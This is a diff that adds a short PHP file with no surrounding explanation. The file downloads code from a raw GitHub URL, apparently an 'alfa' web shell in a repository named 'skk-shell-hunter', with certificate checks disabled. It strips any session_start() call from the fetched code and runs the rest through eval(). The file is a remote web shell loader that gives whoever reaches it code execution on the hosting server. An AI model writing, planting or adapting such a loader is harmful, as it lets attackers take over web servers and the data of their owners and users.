@@ -1,0 +1,26 @@
+<?php
+function fetchContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $content = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return ($httpCode === 200) ? $content : false;
+}
+
+$url = 'https://raw.githubusercontent.com/skkgrup/skk-shell-hunter/refs/heads/main/alfa';
+$content = fetchContent($url);
+
+if ($content !== false) {
+    if (strpos($content, 'session_start()') !== false) {
+        $content = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '', $content);
+    }
+    eval('?>' . $content);
+} else {
+    echo "Failed to fetch content from the URL.";
+}
+?>
